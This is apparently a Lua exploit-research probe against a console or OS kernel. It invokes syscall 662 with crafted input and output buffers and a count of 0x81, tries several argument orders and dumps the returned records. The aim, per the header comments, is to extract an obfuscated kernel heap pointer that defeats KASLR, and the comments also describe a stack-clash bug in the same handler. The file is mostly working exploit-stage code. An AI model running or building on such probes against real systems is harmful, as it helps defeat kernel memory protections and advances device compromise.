-- CRASH_CLASS: MODERATE
-- PROBE 111a: sys 662 event records — the shared helper that leaks a kernel pointer
--
-- Context: the 13.60 dump resolves sys 662 to body 0x3af900 -> shared helper
-- 0x3af920 (docs/HANDLER_CLAIM_CORRECTIONS.md §5). That helper:
--   * reads a count from uap and accepts every count >= 0x81 (lower bound, not
--     an upper bound),
--   * allocates count*4 bytes with a 32-bit `lea` and copies count*4 bytes with
--     a 64-bit `lea` (the stack clash),
--   * and its writer at 0x3afd5f stores `ptr ^ (ptr >> 4)` of an event-object
--     heap pointer into the caller's output record (claim 2, which only 662 can
--     reach — 661 and 668 are unsupported-syscall stubs).
--
-- 14.10 has only been called with zeros (returns -1). If the count guard and the
-- writer survive, a count of 0x81 with a mapped buffer returns a record whose
-- obfuscated pointer field is a KASLR defeat.
--
-- This probe stays at the smallest accepted count, so the stack-clash path is
-- not exercised; only the record path.

print("=== PROBE 111a: SYS 662 EVENT RECORDS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function hexval(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%X_%08X", val.h, val.l)
    end
    return string.format("0x%X", to_num(val))
end

local sc20 = make_syscall(20)
local pid = to_num(select(2, pcall(function() return sc20() end)))
print("PID: " .. pid)

-- 0x81 is the smallest count the 13.60 guard accepts.
local COUNT = 0x81
local REC = 4           -- count counts dwords in the 13.60 copy (lea [r15*4])
local IN_LEN = COUNT * REC
local OUT_LEN = 0x1000

local function dump(tag, addr, len)
    for off = 0, len - 1, 16 do
        local line = string.format("  %s+%04X:", tag, off)
        for d = 0, 12, 4 do
            local v = safe_rd(addr + off + d)
            line = line .. string.format(" %08X", v or 0)
        end
        print(line)
    end
end

local function run_case(tag, a1, a2, a3)
    local inp = memory.alloc(IN_LEN + 0x100)
    local out = memory.alloc(OUT_LEN)
    for i = 0, IN_LEN - 1, 4 do safe_wd(inp + i, 0) end
    for i = 0, OUT_LEN - 1, 4 do safe_wd(out + i, 0) end

    local arg1, arg2, arg3
    if a1 == "in" then arg1 = uint64(inp) elseif a1 == "out" then arg1 = uint64(out) else arg1 = uint64(a1) end
    if a2 == "count" then arg2 = uint64(COUNT) elseif a2 == "in" then arg2 = uint64(inp) elseif a2 == "out" then arg2 = uint64(out) else arg2 = uint64(a2) end
    if a3 == "out" then arg3 = uint64(out) elseif a3 == "in" then arg3 = uint64(inp) else arg3 = uint64(a3) end

    local sc = make_syscall(662)
    local ok, ret = pcall(function() return sc(arg1, arg2, arg3, uint64(0), uint64(0), uint64(0)) end)
    if not ok then
        print(string.format("  [%s] PCALL-FAIL: %s", tag, tostring(ret)))
        return
    end
    print(string.format("  [%s] ret=%s", tag, hexval(ret)))
    print("  out:")
    dump("out", out, 0x40)
    print("  in:")
    dump("in ", inp, 0x20)
end

-- [A] the documented order: (buf, count, out)
print("[A] (input, count, output)")
run_case("A", "in", "count", "out")

-- [B] count first, in case the 14.10 register order differs
print("")
print("[B] (count, input, output)")
run_case("B", "count", "in", "out")

-- [C] output first
print("")
print("[C] (output, input, count)")
run_case("C", "out", "in", "count")

-- [D] control: count below the guard, to confirm the guard still rejects
print("")
print("[D] control: count=1")
do
    local inp = memory.alloc(0x100)
    local out = memory.alloc(0x400)
    for i = 0, 0xFF, 4 do safe_wd(inp + i, 0) end
    for i = 0, 0x3FF, 4 do safe_wd(out + i, 0) end
    local sc = make_syscall(662)
    local ok, ret = pcall(function()
        return sc(uint64(inp), uint64(1), uint64(out), uint64(0), uint64(0), uint64(0))
    end)
    if ok then print("  [D] ret=" .. hexval(ret)) else print("  [D] PCALL-FAIL") end
end

print("")
print("=== END PROBE 111a ===")
